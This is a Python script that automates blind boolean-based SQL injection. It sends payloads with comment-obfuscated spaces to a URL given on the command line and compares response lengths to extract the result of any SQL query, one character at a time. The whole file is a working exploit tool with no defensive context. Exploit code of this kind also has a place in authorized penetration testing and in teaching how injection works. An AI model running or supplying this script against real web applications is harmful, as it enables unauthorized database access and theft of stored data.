import sys
import requests

def sqli(entry_point, inj_str, true_len):
    # search for characters in printable ASCII range
    for j in range(32, 126): 
        target = entry_point + inj_str.replace("[CHAR]", str(j)) 
        r = requests.get(target)
        # Checking response for boolean answer
        # In case query text will be inserted into response, result might be greater than True measured length
        if int(r.headers['Content-Length']) >= true_len :
            return j 
    return None

def sqli_true_len(entry_point):
    target = entry_point + "test')/**/or/**/(select/**/1)=1%23"
    r = requests.get(target)
    return int(r.headers['Content-Length'])

def sqli_false_len(entry_point):
    target = entry_point + "test')/**/or/**/(select/**/0)=1%23"
    r = requests.get(target)
    return int(r.headers['Content-Length'])

def main():
    if len(sys.argv) != 3:
        print('(+) usage example: {} "http://localhost?param=" "select version()"'.format(sys.argv[0]))
    entry_point = sys.argv[1]
    query = sys.argv[2].replace(' ', '/**/')
    # making assumption that True and False answers has different Content-Length header and True>False
    true_len=sqli_true_len(entry_point)
    false_len=sqli_false_len(entry_point)
    if (true_len==false_len):
        print('(-) Entry point is not vulnerable to injection')
        sys.exit()
    i = 1
    while True:
        injection_string = "test')/**/or/**/(ascii(substring(({}),{},1)))=[CHAR]%23".format( query, i )
        try:
            extracted_char = chr(sqli(entry_point, injection_string, true_len)) 
            print(extracted_char, end='', flush=True)
            i+=1
        except TypeError:
            break
    print("\n(+) done!")

if __name__ == "__main__":
    main()
